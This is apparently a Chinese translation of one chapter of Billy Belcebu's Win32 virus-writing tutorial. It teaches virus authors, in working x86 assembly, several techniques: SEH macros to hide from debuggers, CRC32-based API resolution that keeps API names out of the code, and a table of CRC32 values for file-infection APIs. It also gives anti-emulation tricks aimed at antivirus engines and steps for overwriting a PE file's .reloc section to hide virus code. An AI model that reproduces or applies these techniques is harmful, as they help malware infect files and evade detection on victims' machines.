
# Billy Belceb 病毒编写教程 for Win32

> 原文：[`www.pediy.com/kssd/pediy06/pediy657811.htm`](https://www.pediy.com/kssd/pediy06/pediy657811.htm)

## 【高级 Win32 技术】

在这一章，我将讨论一些那些不需要一整章来讨论的技术，但是，不是很容易忘记的:)所以，下面我将讨论这些东西:

- `Structured Exception Handler(SEH)`
- `MultiThreading(多线程)`
- `CRC32 (IT/ET)`
- `AntiEmulators(反模拟)`
- `Overwriting .reloc section(写.reloc 节)`

### Structured Exception Handler

结构化异常处理(Structured Exception Handler),简称 `SEH`，是所有 `Win32` 环境的一个非常酷的特点。它所做的非常容易理解:如果一个一般保护错误(简称 `GPF`)发生了，控制会自动传到当前存在的 `SEH` handler。你看到了它的辅助作用了吗?如果你把所有东西弄乱了，你将能够(仍然能)保持你的病毒没法被发现:)指向 `SEH` handler 的指针是在 `FS:[0000]`中的。所以，你可以很容易地设置你自己的新 `SEH` handler(但是要记住保存旧的!)如果一个错误发生了，控制将会传给你的 `SEH` handler 例程，但是堆栈将会混乱。幸运的是，`Micro$oft` 已经在设置我们的 `SEH` handler 之前把堆栈放到 `ESP+8` 的地方了:)所以，简单的我们只要恢复它并把旧的 `SEH` handler 设置回去就可以了:)让我们看看一个 `SEH` 使用的一个简单例子:

```
;--------从这里开始剪切-------------------------------------------------------
        .386p
        .model  flat                          ; Good good... 32 bit r0x0r
extrn   MessageBoxA:PROC                      ; Defined APIs
extrn   ExitProcess:PROC

        .data
szTitle        db      "Structured Exception Handler [SEH]",0
szMessage      db      "Intercepted General Protection Fault!",0
        .code
start:
        push    offset exception_handler      ; Push our exception handler
                                             ; offset
        push    dword ptr fs:[0000h]         ;
        mov     dword ptr fs:[0000h],esp

errorhandler:
        mov     esp,[esp+8]                 ; Put the original SEH offset
                                             ; Error gives us old ESP
                                             ; in [ESP+8]
        pop     dword ptr fs:[0000h]        ; Restore old SEH handler
        push    1010h                       ; Parameters for MessageBoxA
        push    offset szTitle
        push    offset szMessage
        push    00h
        call    MessageBoxA                 ; Show message :)
        push    00h

        call    ExitProcess                 ; Exit Application
setupSEH:
        xor     eax,eax                     ; Generate an exception
        div     eax
end     start
;--------到这里为止剪切-------------------------------------------------------
```

正如在"Win32 反调试"那一章所看到的，除此之外 `SEH` 还有另外一个特色:)它愚弄了大多数应用级的调试器。为了使你的设置一个新的 `SEH` handler 更简单，这里你可以用一些宏来做做这个(hi,Jacky!):

```
; Put SEH - Sets a new SEH handler
pseh    macro   what2do
        local   @@over_seh_handler
        call    @@over_seh_handler
        mov     esp,[esp+08h]
        what2do
@@over_seh_handler:
        xor     edx,edx
        push    dword ptr fs:[edx]
        mov     dword ptr fs:[edx],esp
        endm

; Restore SEH - Restore old SEH handler
rseh    macro
        xor     edx,edx
        pop     dword ptr fs:[edx]
        pop     edx
        endm
```

它的用法非常简单。例如:

```
        pseh    <jmp SEH_handler>
        div     edx
        push    00h
        call    ExitProcess

SEH_handler:
        rseh
        [...]
```

下面的代码，如果执行了，将会在`rseh`宏之后继续，而不是终止进程。清楚了吗?:)

### 多线程

当我被告知这个可以在 `Win32` 环境很容易实现的时候，在我的脑海中的是许多它的用处:执行代码而其它的代码(也是我们病毒的)也在执行是一个美梦，因为你节约了时间:)

一个多任务的过程的主要算法是:

1. 创建你想要运行的相关线程的代码
2. 在父进程的代码中等待子进程结束

这个看起来很难，但是有两个 `API` 可以救我们。它们的名字：`CreateThread` 和 `WaitForSingleObject`。让我们看看 `Win32` `API` 列表关于这两个 `API` 是怎么说的...

`CreateThread` 函数在调用进程的地址空间中创建一个线程执行。

```
HANDLE CreateThread(
  LPSECURITY_ATTRIBUTES lpThreadAttributes,  // ptr to thread security attrs

  DWORD dwStackSize,                 // initial thread stack size, in bytes
  LPTHREAD_START_ROUTINE lpStartAddress,      // pointer to thread function
  LPVOID lpParameter,                     // argument for new thread
  DWORD dwCreationFlags,                      // creation flags
  LPDWORD lpThreadId              // pointer to returned thread identifier
);
```

参数

`?lpThreadAttributes`:指向一个确定返回句柄可以由子进程继承的 `SECURITY_ATTRIBUTES` 结构。如果 `lpThreadAttributes` 是 `NULL`，这个句柄不能被继承。

`Windows NT`: 这个结构的 `lpSecurityDescriptor` 成员指定新线程的安全描述。如果 `lpThreadAttributes` 是 `NULL`，这个线程获得一个缺省安全描述。

`Windows 95`: 这个结构的 `lpSecurityDescriptor` 成员被忽略了。

`?dwStackSize`: 以字节数指定新线程的堆栈大小。如果指定了 0，堆栈的大小缺省的和进程的主线程的堆栈大小一样。堆栈是在进程的内存空间中自动开辟的，并在线程终止的时候释放。注意如果需要的话，堆栈大小会增加。`CreateThread` 试图把由 `dwStackSize` 指定的大小提交字节数，如果大小超过了可利用的内存的话，就会失败。

`?lpStartAddress`:新线程的开始地址。这个通常是一个用 `WINAPI` 调用惯例声明的函数，这个函数接受一个 32-bit 的指针的参数，并返回一个 32-bit 的退出码。它的原型是:

```
DWORD WINAPI ThreadFunc( LPVOID );
```

`?lpParameter`: 指定一个传给线程的 32-bit 的参数。

`?dwCreationFlags`:指定控制线程创建的额外标志。如果 `CREATE_SUSPENDED` 标志被指定了，线程将以一个挂起状态创建，除非 `ResumeThread` 函数调用，将不会运行。如果这个值是 0，线程在创建之后立即运行。这次，没有其它的支持的值。

`?lpThreadId`: 指向一个接受线程标志的 32bit 变量。

返回值

`?` 如果函数成功了，返回值是一个新线程的句柄。

`?` 如果函数失败了，返回值是 `NULL`。为了获得详细的错误信息，调用 `GetLastError`。

`Windows 95`: `CreateThread` 仅仅是在一个 32-bit 的上下文中的时候才成功。一个 32-bit `DLL` 不能创建一个额外的线程，当那个 `DLL` 正在被一个 16-bit 程序调用的时候。

`WaitForSingleObject` 函数当如下的情况发生的时候返回:

`?` 指定的对象在 signaled 状态。

`?` 过期间隔逝去了。

```
DWORD WaitForSingleObject(
  HANDLE hHandle,                       // handle of object to wait for
  DWORD dwMilliseconds             // time-out interval in milliseconds
);
```

参数

`?hHandle`:识别对象。对一个对象类型的列表，它的句柄可以指定，看看接下来的评论。

`Windows NT`:句柄必须有 `SYNCHRONIZE` 访问。想知道更多的信息，看看 `Access Masks and Access Rights`(访问标志和访问权限)。

`?dwMilliseconds`: 指定过期间隔，以毫秒形式。如果间隔过了，甚至对象的状态是 nonsignaled，这个函数就返回。如果 `dwMilliseconds` 是 0，这个函数就测试对象的状态并立即返回。如果 `dwMilliseconds` 是 `INFINITE` 这个函数从不会过期。

返回值

`?` 如果函数成功了，返回值表明了导致函数返回的事件。

`?` 如果函数失败了，返回值是 `WAIT_FAILED`。为了获得详细的错误信息，调用 `GetLastError`。

如果这个对你来说还不够，或者你不懂试图解释给你听的子句的话，下面给出一个多线程的 ASM 例子。

```
;-------从这里开始剪切------------------------------------------------------
       .586p
       .model flat
extrn   CreateThread:PROC
extrn   WaitForSingleObject:PROC
extrn   MessageBoxA:PROC
extrn   ExitProcess:PROC

       .data
tit1            db      "Parent Process",0
msg1            db      "Spread your wings and fly away...",0
tit2            db      "Child Process",0
msg2            db      "Billy's awesome bullshit!",0
lpParameter     dd      00000000h
lpThreadId      dd      00000000h
       .code
multitask:
        push    offset lpThreadId               ; lpThreadId
        push    00h                             ; dwCreationFlags
        push    offset lpParameter              ; lpParameter
        push    offset child_process            ; lpStartAddress
        push    00h                             ; dwStackSize
        push    00h                             ; lpThreadAttributes
        call    CreateThread
; EAX = Thread handle
        push    00h                             ; 'Parent Process' blah blah
        push    offset tit1
        push    offset msg1
        push    00h
        call    MessageBoxA
        push    0FFh                            ; Wait infinite seconds
        push    eax                             ; Handle to wait (thread)
        call    WaitForSingleObject
        push    00h                             ; Exit program
        call    ExitProcess
child_process:
        push    00h                             ; 'Child Process' blah blah
        push    offset tit2
        push    offset msg2
        push    00h
        call    MessageBoxA
        ret
end     multitask
```



如果你测试上述代码，你将会发现，如果你单击了在子进程中的 `Accept` 按钮，那么你将不得不去单击在父进程中的 `Accept` 按钮。是不是很有意思呀？如果父进程死了，所有相关的线程和它一起死了，但是不过子进程死了，父进程还仍然存活者。

所以看到你可以通过父进程和子进程通过 `WaitForSingleObject` 控制两个进程相当有趣。想象一下可能性：在目录里搜索一个特定文件（如 `MIRC.INI`）同时你在产生一个多态解密程序，并解包余下的东西...哇！;)

看看 `Benny` 的关于 `Threads` 和 `Fibers` (29A#4)的教程。

`% CRC32 (IT/ET) %`

`~~~~~~~~~~~~~`

好了，我们都知道（我希望是这样）怎么编写一个 API 搜索引擎...它相当简单，而且你有许多教程选择（`JHB` 的，`Lord Julus` 的，和这篇教程...），只要得到一个，并学习它。但是，正如你意识到的，API 地址占（让我们说浪费）了你的病毒的许多字节。如果你想要编写一个小病毒，该怎么解决这个问题呢？

解决方法：`CRC32`

我相信 `GriYo` 是第一个使用这个技术的人，在它的令人印象深刻的 `Win32.Parvo` 病毒中（源代码还没有公布）。它不是搜索一个确定数量和我们代码中 API 名字相符的字节，而是获得所有的 API 名，一个接一个，并得到它们的 `CRC32` 值，把它和我们搜索的 API 的 `CRC32` 值。如果它是等价的，那么我们必须总是要处理。Ok,ok...首先，你需要一些获取 `CRC32` 值的代码 :) 让我们用 `Zhengxi` 的代码，首先由 `Vecna` 重新组合了，最终由我重新组合了（优化了一些字节）;)

`;-------到这里为止剪切------------------------------------------------------`

```
;
; CRC32 procedure
; ===============
;
; input:
;   ESI = Offset where code to calculate begins
;   EDI = Size of that code
; output:
;   EAX = CRC32 of  given code
;
 CRC32        proc
        cld
        xor     ecx,ecx                   ; Optimized by me - 2 bytes
        dec     ecx                       ; less
        mov     edx,ecx

NextByteCRC:
        xor     eax,eax
        xor     ebx,ebx
        lodsb
        xor     al,cl
        mov     cl,ch
        mov     ch,dl
        mov     dl,dh
        mov     dh,8

NextBitCRC:
        shr     bx,1
        rcr     ax,1
        jnc     NoCRC
        xor     ax,08320h
        xor     bx,0EDB8h

NoCRC: dec     dh
        jnz     NextBitCRC
        xor     ecx,eax
        xor     edx,ebx
        dec     edi                       ; 1 byte less
        jnz     NextByteCRC
        not     edx
        not     ecx
        mov     eax,edx
        rol     eax,16
        mov     ax,cx
        ret

 CRC32        endp
;------到这里为止剪切--------------------------------------------------------
```

我们现在知道怎么获得一个指定的字符串或代码的 `CRC32` 值了，但是在这里你在期望另外一件事情...呵呵呵，耶！你在等待 API 搜索引擎的代码 :)

`;------从这里开始剪切--------------------------------------------------------`

```
;
; GetAPI_ET_CRC32 procedure
; =========================
; 呵，很难的名字?这个函数在 KERNEL32 的输出表中搜索一个 API 名字(改变一点点将会
; 使它对任何 DLL 有用)，但是仅仅需要 API 的 CRC32 值，不是全字符串:)还需要一个就像
; 我在上面给出的获取 CRC32 的例程。
;
; input:
;        EAX = CRC32 of the API ASCIIz name
; output:
;   EAX = API address
;
 GetAPI_ET_CRC32 proc
        xor     edx,edx
        xchg    eax,edx                   ; Put CRC32 of da api in EDX
        mov     word ptr [ebp+Counter],ax       ; Reset counter
        mov     esi,3Ch
        add     esi,[ebp+kernel]          ; Get PE header of KERNEL32
        lodsw
        add     eax,[ebp+kernel]          ; Normalize
        mov     esi,[eax+78h]             ; Get a pointer to its
        add     esi,1Ch                   ; Export Table
        add     esi,[ebp+kernel]
        lea     edi,[ebp+AddressTableVA]  ; Pointer to the address table
        lodsd                  ; Get AddressTable value
        add     eax,[ebp+kernel]          ; Normalize
        stosd                  ; And store in its variable
        lodsd                  ; Get NameTable value
        add     eax,[ebp+kernel]          ; Normalize
        push    eax               ; Put it in stack
        stosd                  ; Store in its variable
        lodsd                  ; Get OrdinalTable value
        add     eax,[ebp+kernel]          ; Normalize
        stosd                  ; Store
        pop     esi               ; ESI = NameTable VA

@?_3:   push    esi               ; Save again
        lodsd                  ; Get pointer to an API name
        add     eax,[ebp+kernel]          ; Normalize
        xchg    edi,eax               ; Store ptr in EDI
        mov     ebx,edi               ; And in EBX
        push    edi               ; Save EDI
        xor     al,al               ; Reach the null character
        scasb                  ; that marks us the end of
        jnz     $-1               ; the api name
        pop     esi               ; ESI = Pointer to API Name
        sub     edi,ebx               ; EDI = API Name size
        push    edx               ; Save API's CRC32
        call    CRC32               ; Get actual api's CRC32
        pop     edx               ; Restore API's CRC32
        cmp     edx,eax               ; Are them equal?
        jz      @?_4                ; if yes, we got it
        pop     esi               ; Restore ptr to api name
        add     esi,4               ; Get the next
        inc     word ptr [ebp+Counter]      ; And increase the counter
        jmp     @?_3                ; Get another api!

@?_4:

        pop     esi               ; Remove shit from stack
        movzx   eax,word ptr [ebp+Counter]      ; AX = Counter
        shl     eax,1               ; *2 (it's an array of words)
        add     eax,dword ptr [ebp+OrdinalTableVA] ; Normalize
        xor     esi,esi               ; Clear ESI
        xchg    eax,esi               ; ESI = Ptr 2 ordinal; EAX = 0
        lodsw                  ; Get ordinal in AX
        shl     eax,2               ; And with it we go to the
        add     eax,dword ptr [ebp+AddressTableVA] ; AddressTable (array of
        xchg    esi,eax               ; dwords)
        lodsd                  ; Get Address of API RVA
        add     eax,[ebp+kernel]          ; and normalize!! That's it!
        ret

 GetAPI_ET_CRC32 endp

 AddressTableVA dd      00000000h               ;\\
 NameTableVA    dd      00000000h               ; > IN THIS ORDER!!
 OrdinalTableVA dd      00000000h               ;/
 kernel         dd      0BFF70000h              ; Adapt it to your needs ;)
 Counter        dw      0000h
;------到这里为止剪切--------------------------------------------------------
```

下面是等价的代码，但是现在为了操作 `Import Table`，因此使得你能够仅仅用这些 API 的 `CRC32` 就可以编一个 `Per-Process` 驻留病毒 :)

`;------从这里开始剪切--------------------------------------------------------`

```
;
; GetAPI_IT_CRC32 procedure
; =========================
;
; 这个函数将在 Import Table 中搜索和传给例程的 CRC32 值相符的 API。这个对编写一个
; Per-Process 驻留病毒有用(看看这篇教程的"Per-Process residence"一章)。
;
; input:
;        EAX = CRC32 of the API ASCIIz name
; output:
;   EAX = API address
;        EBX = Pointer to the API address in the Import Table
;        CF  = Set if routine failed
;
 GetAPI_IT_CRC32 proc
        mov     dword ptr [ebp+TempGA_IT1],eax  ; Save API CRC32 for later
        mov     esi,dword ptr [ebp+imagebase]   ; ESI = imagebase
        add     esi,3Ch                     ; Get ptr to PE header
        lodsw                     ; AX = That pointer
        cwde                      ; Clear MSW of EAX
        add     eax,dword ptr [ebp+imagebase]   ; Normalize pointer
        xchg    esi,eax                     ; ESI = Such pointer
        lodsd                     ; Get DWORD
```



```asm
    cmp     eax,"EP"                     ; Is there the PE mark?

    jnz     nopes                       ; Fail... duh!

    add     esi,7Ch                     ; ESI = PE header+80h

    lodsd                                ; Look for .idata

  push    eax

    lodsd                                ; Get size

  mov     ecx,eax

  pop     esi

    add     esi,dword ptr [ebp+imagebase]   ; Normalize

SearchK32:

    push    esi                         ; Save ESI in stack

    mov     esi,[esi+0Ch]               ; ESI = Ptr to name

    add     esi,dword ptr [ebp+imagebase]   ; Normalize

    lea     edi,[ebp+K32_DLL]           ; Ptr to 'KERNEL32.dll'

    mov     ecx,K32_Size                ; Size of string

    cld                                 ; Clear direction flag

    push    ecx                         ; Save ECX

    rep     cmpsb                       ; Compare bytes

    pop     ecx                         ; Restore ECX

    pop     esi                         ; Restore ESI

    jz      gotcha                      ; Was it equal? Damn...

    add     esi,14h                     ; Get another field

    jmp     SearchK32                   ; And search again

gotcha:

    cmp     byte ptr [esi],00h          ; Is OriginalFirstThunk 0?

    jz      nopes                       ; Damn if so...

    mov     edx,[esi+10h]               ; Get FirstThunk

    add     edx,dword ptr [ebp+imagebase]   ; Normalize

    lodsd                                ; Get it

    or      eax,eax                     ; Is it 0?

    jz      nopes                       ; Damn...

    xchg    edx,eax                     ; Get pointer to it

  add     edx,[ebp+imagebase]

  xor     ebx,ebx

loopy:

    cmp     dword ptr [edx+00h],00h     ; Last RVA?

    jz      nopes                       ; Damn...

    cmp     byte ptr [edx+03h],80h      ; Ordinal?

    jz      reloop                      ; Damn...

    mov     edi,[edx]                   ; Get pointer of an imported

    add     edi,dword ptr [ebp+imagebase]   ; API

  inc     edi

  inc     edi

    mov     esi,edi                     ; ESI = EDI

    pushad                              ; Save all regs

    eosz_edi                            ; Get end of string in EDI

    sub     edi,esi                     ; EDI = API size

  call    CRC32

    mov     [esp+18h],eax               ; Result in ECX after POPAD

  popad

    cmp     dword ptr [ebp+TempGA_IT1],ecx  ; Is the CRC32 of this API

    jz      wgotit                      ; equal as the one we want?

reloop:

    inc     ebx                         ; If not, loop and search for

    add     edx,4                       ; another API in the IT

  loop    loopy

wegotit:

    shl     ebx,2                       ; Multiply per 4

    add     ebx,eax                     ; Add FirstThunk

    mov     eax,[ebx]                   ; EAX = API address

    test    al,00h                      ; Overlap: avoid STC :)

  org     $-1

nopes:

  stc

  ret

GetAPI_IT_CRC32 endp

TempGA_IT1      dd      00000000h

imagebase       dd      00400000h

K32_DLL         db      "KERNEL32.dll",0

K32_Size        equ     $-offset K32_DLL

;------到这里为止剪切--------------------------------------------------------
```

Happy? 耶，它令人震惊而且它很简单! 而且，毫无疑问，如果你的病毒没有加密，你可以避免使用者的怀疑，因为没有明显的 API 名字 :) 好了，我将列出一些 API 的 CRC32 值 (包括 API 结束的 NULL 字符)，但是，如果你想要使用其它的 API 而不是我将要列在这里的 API，我将再放一个小程序，能给你一个 ASCII 字符串的 CRC32 值。

一些 API 的 CRC32:

| API name | CRC32 | API name | CRC32 |
| :--- | :--- | :--- | :--- |
| `CreateFileA` | `08C892DDFh` | `CloseHandle` | `068624A9Dh` |
| `FindFirstFileA` | `0AE17EBEFh` | `FindNextFileA` | `0AA700106h` |
| `FindClose` | `0C200BE21h` | `CreateFileMappingA` | `096B2D96Ch` |
| `GetModuleHandleA` | `082B618D4h` | `GetProcAddress` | `0FFC97C1Fh` |
| `MapViewOfFile` | `0797B49ECh` | `UnmapViewOfFile` | `094524B42h` |
| `GetFileAttributesA` | `0C633D3DEh` | `SetFileAttributesA` | `03C19E536h` |
| `ExitProcess` | `040F57181h` | `SetFilePointer` | `085859D42h` |
| `SetEndOfFile` | `059994ED6h` | `DeleteFileA` | `0DE256FDEh` |
| `GetCurrentDirectoryA` | `0EBC6C18Bh` | `SetCurrentDirectoryA` | `0B2DBD7DCh` |
| `GetWindowsDirectoryA` | `0FE248274h` | `GetSystemDirectoryA` | `0593AE7CEh` |
| `LoadLibraryA` | `04134D1ADh` | `GetSystemTime` | `075B7EBE8h` |
| `CreateThread` | `019F33607h` | `WaitForSingleObject` | `0D4540229h` |
| `ExitThread` | `0058F9201h` | `GetTickCount` | `0613FD7BAh` |
| `FreeLibrary` | `0AFDF191Fh` | `WriteFile` | `021777793h` |
| `GlobalAlloc` | `083A353C3h` | `GlobalFree` | `05CDF6B6Ah` |
| `GetFileSize` | `0EF7D811Bh` | `ReadFile` | `054D8615Ah` |
| `GetCurrentProcess` | `003690E66h` | `GetPriorityClass` | `0A7D0D775h` |
| `SetPriorityClass` | `0C38969C7h` | `FindWindowA` | `085AB3323h` |
| `PostMessageA` | `086678A04h` | `MessageBoxA` | `0D8556CF7h` |
| `RegCreateKeyExA` | `02C822198h` | `RegSetValueExA` | `05B9EC9C6h` |
| `MoveFileA` | `02308923Fh` | `CopyFileA` | `05BD05DB1h` |
| `GetFullPathNameA` | `08F48B20Dh` | `WinExec` | `028452C4Fh` |
| `CreateProcessA` | `0267E0B05h` | `_lopen` | `0F2F886E3h` |
| `MoveFileExA` | `03BE43958h` | `CopyFileExA` | `0953F2B64h` |
| `OpenFile` | `068D8FC46h` | | |

你还想要其它的 API 吗?

你有可能需要知道其它 API 名字的 CRC32 值，所以这里我将给出小而有效的用来帮助我自己的程序，我希望对你也有帮助。

;------从这里开始剪切--------------------------------------------------------

```asm
        .586

        .model  flat

        .data

 extrn         ExitProcess:PROC

 extrn         MessageBoxA:PROC

 extrn         GetCommandLineA:PROC

 titulo        db "GetCRC32 by Billy Belcebu/iKX",0

 message       db "SetEndOfFile"              ; Put here the string you

                                             ; want to know its CRC32

 _             db 0

                db "CRC32 is "

 crc32_        db "00000000",0

        .code

 test:

        mov     edi,_-message

        lea     esi,message                   ; Load pointer to API name

        call    CRC32                         ; Get its CRC32

        lea     edi,crc32_                    ; Transform hex to text

        call    HexWrite32

        mov     _," "                        ; make 0 to be an space

        push    00000000h                     ; Display message box with

        push    offset titulo                 ; the API name and its CRC32

        push    offset message

        push    00000000h

        call    MessageBoxA

        push    00000000h

        call    ExitProcess

 HexWrite8     proc                           ; This code has been taken

        mov     ah,al                          ; from the 1st generation

        and     al,0Fh                         ; host of Bizatch

        shr     ah,4

        or      ax,3030h

        xchg    al,ah

        cmp     ah,39h

        ja      @@4

@@1:

        cmp     al,39h

        ja      @@3

@@2:

        stosw

        ret

@@3:

        sub     al,30h

        add     al,'A' - 10

        jmp     @@2

@@4:

        sub     ah,30h

        add     ah,'A' - 10

        jmp     @@1

 HexWrite8     endp

 HexWrite16    proc
```



## 汇编代码片段

```
push    ax  
xchg    al,ah  
call    HexWrite8  
pop     ax  
call    HexWrite8  
ret  
HexWrite16      endp  
HexWrite32      proc  
push    eax  
shr     eax, 16  
call    HexWrite16  
pop     eax  
call    HexWrite16  
ret  
HexWrite32      endp  
CRC32           proc  
cld  
xor     ecx,ecx               ; Optimized by me - 2 bytes  
dec     ecx                   ; less  
mov     edx,ecx  
NextByteCRC:  
xor     eax,eax  
xor     ebx,ebx  
lodsb  
xor     al,cl  
mov     cl,ch  
mov     ch,dl  
mov     dl,dh  
mov     dh,8  
NextBitCRC:  
shr     bx,1  
rcr     ax,1  
jnc     NoCRC  
xor     ax,08320h  
xor     bx,0EDB8h  
NoCRC: dec     dh  
jnz     NextBitCRC  
xor     ecx,eax  
xor     edx,ebx  
dec     edi                   ; 1 byte less  
jnz     NextByteCRC  
not     edx  
not     ecx  
mov     eax,edx  
rol     eax,16  
mov     ax,cx  
ret  
CRC32           endp  
end    test
```

;------到这里为止剪切--------------------------------------------------------

Cool，哈? :)

## 反模拟(AntiEmulators)

### \~ 正如在这篇文档的许多地方，这个小章节是由 Super 和我合作的。这里将会有一些东西的列表，肯定会愚弄反病毒模拟系统的，一些小的调试器也不例外。Enjoy!

- 用 `SEH` 产生错误。例子:

    ```
    pseh    <jmp virus_code>
    dec     byte ptr [edx] ; <-- or another exception, such as 'div edx'
    [...] <-- if we are here, we are being emulated!
    virus_code:
    rseh
    [...] <-- the virus code :)
    ```

- 使用 `CS` 段前缀。 例子:

    ```
    jmp     cs:[shit]
    call    cs:[shit]
    ```

- 使用 `RETF`。例子:

    ```
    push    cs
    call    shit
    retf
    ```

- 玩玩 `DS`. 例子:

    ```
    push    ds
    pop     eax
    ```

    或者甚至更好:

    ```
    push    ds
    pop     ax
    ```

    或者更好:

    ```
    mov     eax,ds
    push    eax
    pop     ds
    ```

- 用 `PUSH CS/POP REG` 招检测 `NODiCE` 模拟 :

    ```
    mov     ebx,esp
    push    cs
    pop     eax
    cmp     esp,ebx
    jne     nod_ice_detected
    ```

- 使用无正式文档的操作码:

    ```
    salc    ; db 0D6h
    bpice   ; db 0F1h
    ```

- 使用 `Threads` and/or `Fibers`.

我希望所有这些东西将对你有用 :)

## 写 .reloc 节

### \~ 这是一个非常有意思的东西。如果 `PE` 文件的 `ImageBase` 因为某种原因改变了，但是不是总会发生的(99.9%), '.reloc'就非常有用了，但不是必须的。而且 '.reloc' 节通常非常巨大，所以为什么不使用它来存储我们的病毒呢?我建议你读读 `b0z0` 在 `Xine#3` 上的教程，叫做 "Ideas and theoryes on PE infection"，因为它提供给我们许多有意思的信息。好了，如果你想知道该怎样写 `.reloc` 节的话，只要按照如下:

+ 在节头中:
    1. 把病毒的大小+它的堆赋给新的 `VirtualSize`
    2. 把对齐后的 `VirtualSize` 赋给新的 `SizeOfRawData`
    3. 清除 `PointerToRelocations` 和 `NumberOfRelocations`
    4. 改变 `.reloc` 名字为另外一个

+ 在 `PE` 头中:
    1. 清除 offset `A0h` (`RVA to fixup table`)
    2. 清除 offset `A4h` (`Size of such table`)

病毒的入口将会是节的 `VirtualAddress`。它还有时候，隐蔽的(stealthy)，因为有时候大小不增长(在不是很大的病毒中)，因为 `relocs` 通常非常巨大。

`4dd466d0e1e0cc123afbe504da2462ca`
